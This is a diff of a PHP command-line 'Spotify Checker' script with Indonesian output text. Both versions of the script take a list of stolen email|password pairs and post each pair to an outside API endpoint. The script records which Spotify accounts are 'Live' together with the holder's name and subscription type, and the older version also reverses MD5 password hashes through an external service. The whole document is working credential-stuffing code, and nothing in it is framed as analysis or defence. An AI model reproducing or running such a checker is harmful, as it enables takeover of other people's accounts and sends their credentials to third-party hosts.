@@ -1,45 +1,74 @@
-<?php
-ob_implicit_flush(true);
+<?php  
+date_default_timezone_set('Asia/Jakarta');
 error_reporting(0);
-function in_string($s,$as) {
-	$s=strtoupper($s);
-	if(!is_array($as)) $as=array($as);
-	for($i=0;$i<count($as);$i++) if(strpos(($s),strtoupper($as[$i]))!==false) return true;
-	return false;
+ini_set('display_errors', 0);
+function microtime_float()
+{
+    list($usec, $sec) = explode(" ", microtime());
+    return ((float)$usec + (float)$sec);
+}
+function curl ($url, $data) {
+	$ch = curl_init();
+	
+	curl_setopt($ch, CURLOPT_URL, $url);
+	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+	curl_setopt($ch, CURLOPT_POST, 1);
+	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
+	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
+	$headers = array();
+	$headers[] = 'Accept-Encoding: gzip, deflate, br';
+	$headers[] = 'Accept-Language: en-US,en;q=0.9';
+	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 OPR/57.0.3098.106';
+	$headers[] = 'Accept: application/json, text/plain, */*';
+	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+	$result = curl_exec($ch);
+	if (curl_errno($ch)) {
+		echo 'Error:' . curl_error($ch);
+	}
+	curl_close ($ch);
+	return $result;
 }
 echo "============================================\n";
 echo "              Spotify Checker "; 
 echo "\n============================================\n";
-echo "Created by : \033[92mmbul48 \n\033[0mAPI From   : \033[95mmbul48 \033[0m\nInstagram  : @mbul48\n";
+echo "Created by : \033[92mMr.Dzer0 \n\033[0mAPI From   : \033[95mKirnath Morscheck \033[0m\nCredit     : @2019\n";
 echo "============================================\n";
-$file = file_get_contents("list.txt");
-$data = explode("\n",$file);
+echo "Nama File list : ";
+$namafile = trim(fgets(STDIN));
+$time_start = microtime_float();
+$file = "$namafile.txt";
+$ndata = array_sum(explode(' ', microtime()));
+$baris = count(file($file));
 $jumlah= 0; $live=0; $mati=0;
-for($a=0;$a<count($data);$a++){
-        $data1 = explode("|",$data[$a]);
-        $email = $data1[0];
-        $pass = $data1[1];
-	if($argv[2]=="--md5"){
-		$get = @file_get_contents("https://lea.kz/api/hash/$pass");
-		$json = json_decode($get,true);
-		$pass = $json['password'];
+$myfile = fopen("$namafile.txt", "r") or die("Unable to open file!");
+while(! feof($myfile)){
+$jumlah+=1;
+	$path = 'resultspotify.txt';
+    $fh = fopen($path,"a+");
+ 
+$referrer= trim(fgets($myfile));
+list($email,$password)=explode('|',$referrer);	
+		$regis = curl("http://mynetb.com/api/spot.php", "email=$email&password=$password");
+	    // echo $result = $regis;
+		$bates = '/"[^"]*"/m';
+		$time_end = microtime_float(); $time = $time_end - $time_start;  $nana = substr($time,0,4);		
+		preg_match_all($bates, $regis, $matches, PREG_SET_ORDER, 0);
+		$nil = $matches[1][0]; $nama = $matches[5][0]; $sub = $matches[7][0]; $erorr = $matches[3][0];
+		if(preg_match("/success/i", $nil)){
+			echo "[\033[92mLive\033[0m] $email | $password | eror=$erorr | Nama=$nama | jenis=$sub "; $live+=1;
+			$hasil="[Live] $email | $password | eror=$erorr | Nama=$nama | jenis=$sub \n";
+			fwrite($fh,$hasil); // Write information to the file 
+			fclose($fh);
+		}
+		else { 
+		echo "[\033[91mDiee\033[0m] $email | $password "; $mati+=1;
+		}
+		echo "\033[92m($jumlah/$baris) \033[95m$nana"."s\033[0m\n";
 	}
-	$cek = @file_get_contents("https://nanikore-lalalalisa.c9users.io/spotify.php?email=$email&pass=$pass");
-	if (strpos($cek,"Spotify")) {
- if(!in_array($cek,explode("\n",@file_get_contents("spotify-live.txt")))){
-  $h=fopen("spotify-live.txt","a");
-  fwrite($h,$cek."\n");
-  fclose($h);
-  }
-		$cek = "\033[92m [Live] \033[0m".$cek; $live+=1;
-  }else{
-		$cek = "\033[91m [Diee] \033[0m".$cek; $mati+=1;
-	}
-	ob_flush();
-	sleep(5);
-   print($cek."\n");
-}
-	echo "============================================\n";
-	print ("Account \033[1;34mChecked : " . count($data). "\033[0m\n");
-	echo "Account \033[92mLive: $live \033[0mand account \033[91mDie: $mati\033[0m \n";
-	echo "\033[92mE\033[0m\033[93mN\033[0m\033[94mJ\033[0m\033[95mO\033[0m\033[96mY\033[0m\033[91mY\033[0m\n";
+echo "============================================\n";	
+echo "Account \033[92mLive:$live \033[0mdan account \033[91mDie:$mati\033[0m";
+echo "\nResult Live Disimpan Pada File \033[92mresultspotify.txt\033[0m\n";	
+?>
